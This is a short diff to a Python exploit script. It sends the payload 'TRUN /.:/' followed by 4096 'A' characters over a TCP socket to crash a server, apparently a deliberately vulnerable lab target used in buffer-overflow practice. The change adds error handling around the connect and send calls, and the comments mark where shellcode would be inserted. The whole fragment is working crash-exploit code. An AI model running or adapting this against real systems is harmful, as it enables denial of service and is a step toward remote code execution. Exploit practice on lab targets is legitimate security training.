@@ -14,6 +14,9 @@ except:
 a="A"*4096 #Set death string
 exploit="TRUN /.:/"+str(a) #Generate exploit content. This is where shellcode would be loaded. 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((host, port))
-s.sendall(exploit) #Do not listen for return data, so that this program may be looped easily without hanging.
-s.close()
+try:
+    s.connect((host, port))
+    s.sendall(exploit) #Do not listen for return data, so that this program may be looped easily without hanging.
+    s.close()
+except:
+    print("Could not connect! :(") #We assume that a failure to execute is due to a failed connection. 
